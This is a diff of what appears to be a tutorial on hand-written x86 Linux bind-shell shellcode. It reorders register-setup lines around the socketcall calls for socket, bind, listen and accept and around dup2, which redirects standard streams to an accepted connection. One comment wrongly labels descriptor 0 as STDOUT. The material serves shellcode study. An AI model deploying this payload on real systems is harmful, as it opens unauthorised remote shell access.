@@ -168,8 +168,8 @@ push edx            ; 0
 push 0x1            ; SOCK_STREAM = 1
 push 0x2            ; AF_INET = 2
 ; int socketcall(int call, unsigned long *args);
-inc bl              ; socketcall call sys_socket = 1
 mov ecx, esp        ; socketcall *args
+inc bl              ; socketcall call sys_socket = 1
 mov al, 0x66        ; socketcall
 int 0x80            ; returns int sockfd in eax
 mov esi, eax        ; store int sockfd in esi
@@ -200,8 +200,8 @@ push 0x10           ; sizeof(addr) = 16
 push ecx            ; (struct sockaddr *)&addr
 push esi            ; sockfd
 ; int socketcall(int call, unsigned long *args);
-inc bl              ; socketcall call sys_bind = 2
 mov ecx, esp        ; socketcall *args
+inc bl              ; socketcall call sys_bind = 2
 mov al, 0x66        ; socketcall
 int 0x80            ; returns 0 in eax
 ```
@@ -216,8 +216,8 @@ Call to `listen`
 push edx            ; 0
 push esi            ; sockfd
 ; int socketcall(int call, unsigned long *args);
-mov bl, 0x4         ; socketcall call sys_listen = 4
 mov ecx, esp        ; socketcall *args
+mov bl, 0x4         ; socketcall call sys_listen = 4
 mov al, 0x66        ; socketcall
 int 0x80            ; returns 0 in eax
 ```
@@ -233,8 +233,8 @@ push edx            ; NULL
 push edx            ; NULL
 push esi            ; sockfd
 ; int socketcall(int call, unsigned long *args);
-inc bl              ; socketcall call sys_accept = 5
 mov ecx, esp        ; socketcall *args
+inc bl              ; socketcall call sys_accept = 5
 mov al, 0x66        ; socketcall
 int 0x80            ; returns int connfd in eax
 ```
@@ -249,9 +249,9 @@ Next, a system call to to `dup2` is required which is assigned the system call n
 ```nasm
 ; // Direct Connection Socket Output
 ; int dup2(int oldfd, int newfd);
-mov ebx, eax        ; store int connfd in ebx
 ; dup2(connfd, 0);
 mov ecx, edx        ; 0 = STDOUT
+mov ebx, eax        ; store int connfd in ebx
 mov al, 0x3f        ; dup2
 int 0x80
 ; dup2(connfd, 1);
